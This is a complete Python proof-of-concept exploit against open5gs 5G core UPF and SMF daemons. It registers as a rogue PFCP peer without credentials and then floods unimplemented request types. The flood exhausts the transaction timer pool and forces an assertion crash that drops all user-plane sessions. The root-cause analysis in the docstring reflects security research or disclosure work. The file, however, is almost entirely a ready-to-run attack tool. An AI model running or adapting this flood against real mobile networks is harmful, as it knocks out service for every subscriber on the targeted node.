#!/usr/bin/env python3
"""open5gs UPF/SMF PFCP remote-transaction pool exhaustion -> ogs_assert() SIGABRT.

Root cause (open5gs lib/pfcp/xact.c):

    if (!new) {
        new = ogs_pfcp_xact_remote_create(node, sqn);   // xact.c:767
    }
    ogs_assert(new);                                    // xact.c:769  <-- ABORT

ogs_pfcp_xact_remote_create() returns NULL when the xact pool OR the timer pool
is exhausted (xact.c:146-150, :160-165, :172-177, :184-189).  Each remote xact
grabs THREE timers (tm_response / tm_holding / tm_delayed_commit) while open5gs
sizes pool.timer and pool.xact identically (lib/app/ogs-config.c:72 and :76,
both = max.ue * 16).  Default max.ue = 1024 (ogs-config.c:115) -> 16384 slots
each, so the timer pool drains after only 16384/3 = 5461 live remote xacts.

A PFCP request the receiving NF does not implement is never committed: the UPF
state machine just logs it (src/upf/pfcp-sm.c:302-305, "Not implemented PFCP
message type[%d]") and the SMF state machine does the same
(src/smf/pfcp-sm.c:387-390), so the xact is only reclaimed when tm_holding
fires, i.e. after t1_holding_duration = 3 * (10 s / 4) = 7.5 s
(ogs-config.c:380-393).  Holding 5461 such xacts therefore needs only ~730
pkt/s, and a single-threaded open5gs daemon parses PFCP fast enough (~4000
pkt/s measured) to hold ~30000 of them.

Attack
  phase 1  PFCP Association Setup Request (type 5) from any source IP.
           src/upf/pfcp-path.c:129-141 (and src/smf/pfcp-path.c:165-179) accept
           it and call ogs_pfcp_node_add(), so the attacker becomes a legitimate
           PFCP peer -- no credentials and no prior knowledge of the network
           required.
  phase 2  flood a PFCP request type that the target NF does not implement, with
           monotonically increasing sequence numbers:
             UPF -> type 56 Session Report Request
             SMF -> type 54 Session Deletion Request
           Both are INITIAL_STAGE in ogs_pfcp_xact_get_stage() (xact.c:789-810),
           so a remote xact is allocated for every distinct sqn, and neither NF
           implements the type, so none is ever committed or freed.

Result: open5gs-upfd / open5gs-smfd aborts -- SIGABRT (exit 134) at
lib/pfcp/xact.c:769, the container dies, and every user-plane session on that
NF is dropped.

Usage:
  ./poc_pfcp_xact_dos.py -t 172.22.0.8 [--flood-type 56] [-n 6000] [-r 4000]
  ./poc_pfcp_xact_dos.py -t 172.22.0.7 [--flood-type 54] [-n 6000] [-r 4000]
                         [-p 8805] [--node-ip 172.22.0.1] [--dry-run]

Python 3 stdlib only.
"""

import argparse
import errno
import socket
import struct
import sys
import time

# PFCP message types (TS 29.244 Table 7.2.1-1 / lib/pfcp/message.h:67+)
PFCP_HEARTBEAT_REQUEST = 1
PFCP_HEARTBEAT_RESPONSE = 2
PFCP_ASSOCIATION_SETUP_REQUEST = 5
PFCP_ASSOCIATION_SETUP_RESPONSE = 6
PFCP_ASSOCIATION_UPDATE_REQUEST = 7
PFCP_SESSION_DELETION_REQUEST = 54
PFCP_SESSION_REPORT_REQUEST = 56

# PFCP IE types
IE_NODE_ID = 60
IE_RECOVERY_TIME_STAMP = 96
IE_REPORT_TYPE = 39

#   #define OGS_PFCP_NODE_ID_IPV4   0
#   #define OGS_PFCP_NODE_ID_IPV6   1
#   #define OGS_PFCP_NODE_ID_FQDN   2
# The Node ID IE's first octet is decoded as
#   ED2(uint8_t spare:4;, uint8_t type:4;)      (types.h:564-572)
# which on a little-endian build places `type` in the LOW nibble.
NODE_ID_TYPE_IPV4 = 0x00
NODE_ID_TYPE_IPV6 = 0x01
NODE_ID_TYPE_FQDN = 0x02



def pfcp_header(msg_type, seq, body_len, seid=None):
    """Build a PFCP header.  seid=None -> node-related message (S=0, 8-byte hdr).

    Wire layout verified against a live open5gs SMF<->UPF heartbeat capture:
      byte0   : version(3 bits, =1) | spare(3) | MP(1) | S(1)  -> 0x20 or 0x21
      byte1   : message type
      byte2-3 : message length = len(everything after the first 4 bytes)
      S=0 : byte4-6 sequence number, byte7 spare                     (8 bytes)
      S=1 : byte4-11 SEID, byte12-14 sequence number, byte15 spare  (16 bytes)
    """
    flags = 0x20 | (0x01 if seid is not None else 0x00)
    if seid is None:
        return struct.pack(">BBH", flags, msg_type, 4 + body_len) + \
            struct.pack(">I", seq << 8)
    return struct.pack(">BBH", flags, msg_type, 12 + body_len) + \
        struct.pack(">Q", seid) + struct.pack(">I", seq << 8)


def tlv(ie_type, value):
    """PFCP IE: 16-bit IE type, 16-bit IE length, value (TS 29.244 8.1.1)."""
    return struct.pack(">HH", ie_type, len(value)) + value


def recovery_ts():
    return struct.pack(">I", int(time.time()) & 0xFFFFFFFF)


def build_association_setup_request(seq, node_ip):
    """Node-related (S=0) Association Setup Request carrying Node ID + RecovTS."""
    body = tlv(IE_NODE_ID, bytes([NODE_ID_TYPE_IPV4]) + socket.inet_aton(node_ip))
    body += tlv(IE_RECOVERY_TIME_STAMP, recovery_ts())
    return pfcp_header(PFCP_ASSOCIATION_SETUP_REQUEST, seq, len(body)) + body


# TS 29.244 Table 7.2.1-1: node-related messages carry S=0 (8-byte header),
# session-related messages carry S=1 (16-byte header).
NODE_RELATED_TYPES = frozenset(
    (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 43, 44))

# lib/pfcp/util.c:57-161 marks these OGS_PFCP_NODE_ID_MANDATORY, so sending one
# without a Node ID IE makes ogs_pfcp_extract_node_id() return
# OGS_PFCP_ERROR_NODE_ID_NOT_PRESENT and src/{upf,smf}/pfcp-path.c drops the
# packet ("goto cleanup") BEFORE any transaction is allocated.
NODE_ID_MANDATORY_TYPES = frozenset(
    (3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 43, 44, 50, 51))


def build_flood_packet(msg_type, seq, seid, node_ip=None):
    """A PFCP request that is INITIAL_STAGE (so a remote transaction is created
    for it) but that the target NF does not implement (so the transaction is
    never committed and lives until tm_holding fires, 7.5 s).

      UPF target -> type 56 Session Report Request   (src/upf/pfcp-sm.c:302-305)
      SMF target -> type 54 Session Deletion Request (src/smf/pfcp-sm.c:387-390)

    An empty body is accepted by ogs_pfcp_parse_msg(): once the header is pulled,
    pkbuf->len == 0 makes it return immediately (lib/pfcp/message.c:5729-5730),
    and types 54/56 require no Node ID (lib/pfcp/util.c:149-155 ->
    OGS_PFCP_STATUS_NODE_ID_NONE), so the message is dispatched to the NF state
    machine and a remote transaction is allocated for it.
    """
    body = b""
    if msg_type == PFCP_SESSION_REPORT_REQUEST:
        body = tlv(IE_REPORT_TYPE, bytes([0x08]))
    if msg_type in NODE_ID_MANDATORY_TYPES and node_ip:
        body += tlv(IE_NODE_ID,
                    bytes([NODE_ID_TYPE_IPV4]) + socket.inet_aton(node_ip))
    if msg_type in NODE_RELATED_TYPES:
        return pfcp_header(msg_type, seq, len(body)) + body
    return pfcp_header(msg_type, seq, len(body), seid=seid) + body


def build_heartbeat_response(seq):
    body = tlv(IE_RECOVERY_TIME_STAMP, recovery_ts())
    return pfcp_header(PFCP_HEARTBEAT_RESPONSE, seq, len(body)) + body


def recv_responses(sock, deadline, verbose=False):
    """Drain replies (Association Setup Response, UPF-initiated heartbeats)."""
    out = []
    sock.setblocking(False)
    while time.time() < deadline:
        try:
            data, addr = sock.recvfrom(4096)
        except OSError as exc:
            if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                time.sleep(0.02)
                continue
            break
        if data:
            out.append((addr, data[1] if len(data) > 1 else -1, data))
            if verbose:
                print("    <- %s type=%s len=%d hex=%s"
                      % (addr[0], out[-1][1], len(data), data[:24].hex()),
                      flush=True)
    return out


def answer_heartbeats(sock, pkts, verbose=False):
    """Reply to UPF-initiated Heartbeat Requests so the peer stays associated."""
    for addr, msg_type, data in pkts:
        if msg_type != PFCP_HEARTBEAT_REQUEST or len(data) < 8:
            continue
        seq = struct.unpack(">I", data[4:8])[0] >> 8
        sock.sendto(build_heartbeat_response(seq), addr)
        if verbose:
            print("    -> heartbeat response seq=%d to %s" % (seq, addr[0]),
                  flush=True)



def main():
    ap = argparse.ArgumentParser(
        description="open5gs PFCP remote-transaction pool exhaustion PoC "
                    "(ogs_assert at lib/pfcp/xact.c:769)")
    ap.add_argument("-t", "--target", required=True,
                    help="target NF PFCP IP (open5gs UPF 172.22.0.8, "
                         "SMF 172.22.0.7)")
    ap.add_argument("-p", "--port", type=int, default=8805, help="PFCP port")
    ap.add_argument("-n", "--count", type=int, default=6000,
                    help="number of flood packets (must exceed pool.timer/3, "
                         "i.e. 5461 at the open5gs default max.ue=1024)")
    ap.add_argument("-r", "--rate", type=int, default=4000,
                    help="target packets/second (must exceed count/7.5 to win "
                         "the holding-timer race)")
    ap.add_argument("--flood-type", type=int, default=PFCP_SESSION_REPORT_REQUEST,
                    help="PFCP request type for the flood: 56 (Session Report "
                         "Request) for a UPF target, 54 (Session Deletion "
                         "Request) for an SMF target")
    ap.add_argument("--node-ip", default=None,
                    help="IPv4 advertised in the PFCP Node ID IE (default: the "
                         "local address of the route to the target)")
    ap.add_argument("--bind", default="0.0.0.0", help="local bind address")
    ap.add_argument("--sport", type=int, default=8805, help="local UDP source port")
    ap.add_argument("--seid", type=lambda x: int(x, 0), default=0x1122334455667788,
                    help="SEID in the flood packets (must be unknown to the UPF)")
    ap.add_argument("--assoc-only", action="store_true",
                    help="run only phase 1 (establish the rogue PFCP association)")
    ap.add_argument("--skip-assoc", action="store_true",
                    help="skip phase 1 (peer already associated)")
    ap.add_argument("--dry-run", action="store_true",
                    help="print the crafted packets as hex and exit")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    dst = (args.target, args.port)

    node_ip = args.node_ip
    if node_ip is None:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        probe.connect(dst)
        node_ip = probe.getsockname()[0]
        probe.close()

    if args.dry_run:
        print("[dry-run] ASSOCIATION_SETUP_REQUEST : %s"
              % build_association_setup_request(1, node_ip).hex())
        print("[dry-run] flood packet (type %d)      : %s"
              % (args.flood_type,
                 build_flood_packet(args.flood_type, 2, args.seid,
                                    node_ip).hex()))
        return 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((args.bind, args.sport))
    except OSError as exc:
        print("[!] bind(%s:%d) failed: %s -- retrying with an ephemeral port"
              % (args.bind, args.sport, exc), file=sys.stderr)
        sock.bind((args.bind, 0))

    print("[*] open5gs PFCP transaction-pool exhaustion PoC")
    print("[*] target      : %s:%d" % dst)
    print("[*] attacker IP : %s:%d  (advertised as PFCP Node ID)"
          % (node_ip, sock.getsockname()[1]))
    print("[*] flood type  : %d   packets: %d   rate: %d pps"
          % (args.flood_type, args.count, args.rate))

    seq = 1

    # ---- phase 1: turn the attacker into a legitimate PFCP peer ----
    if not args.skip_assoc:
        pkt = build_association_setup_request(seq, node_ip)
        print("[*] phase 1: PFCP Association Setup Request (seq=%d, %d bytes)"
              % (seq, len(pkt)))
        sock.sendto(pkt, dst)
        seq += 1
        pkts = recv_responses(sock, time.time() + 3.0, args.verbose)
        got = [p for p in pkts if p[1] == PFCP_ASSOCIATION_SETUP_RESPONSE]
        if got:
            print("[+] phase 1: Association Setup Response received "
                  "(cause=%s) -- rogue peer accepted" % got[0][2][-1:])
        else:
            print("[!] phase 1: no Association Setup Response after 3 s "
                  "(types seen: %s) -- continuing anyway"
                  % sorted({p[1] for p in pkts}))
        answer_heartbeats(sock, pkts, args.verbose)

    if args.assoc_only:
        sock.close()
        return 0

    # ---- phase 2: drain pool.timer (3 timer slots per uncommitted xact) ----
    print("[*] phase 2: flooding %d x PFCP type-%d requests, each pinning "
          "3 timer slots for 7.5 s" % (args.count, args.flood_type))
    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    t0 = time.time()
    next_beat = t0 + 2.0
    sent = 0
    for i in range(args.count):
        pkt = build_flood_packet(args.flood_type, seq, args.seid, node_ip)
        seq = ((seq + 1) & 0xFFFFFF) or 1
        try:
            sock.sendto(pkt, dst)
        except OSError as exc:
            print("[!] sendto failed at packet %d: %s" % (i, exc),
                  file=sys.stderr)
            break
        sent += 1
        if interval:
            delay = (t0 + (i + 1) * interval) - time.time()
            if delay > 0:
                time.sleep(delay)
        if time.time() > next_beat:
            elapsed = time.time() - t0
            print("    ... sent %d/%d in %.2f s (%.0f pps)"
                  % (sent, args.count, elapsed,
                     sent / elapsed if elapsed else 0), flush=True)
            answer_heartbeats(sock,
                              recv_responses(sock, time.time() + 0.05,
                                             args.verbose), args.verbose)
            next_beat = time.time() + 2.0

    elapsed = time.time() - t0
    print("[*] phase 2 complete: %d packets in %.2f s (%.0f pps)"
          % (sent, elapsed, sent / elapsed if elapsed else 0))
    print("[*] expected crash signature in the target NF log:")
    print("      Maximum number of xact->tm_holding[<pool.timer>] reached")
    print("      (or xact->tm_response[...] / xact->tm_delayed_commit[...])")
    print("      ogs_pfcp_xact_receive: Assertion `new' failed. "
          "(../lib/pfcp/xact.c:769)")
    sock.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
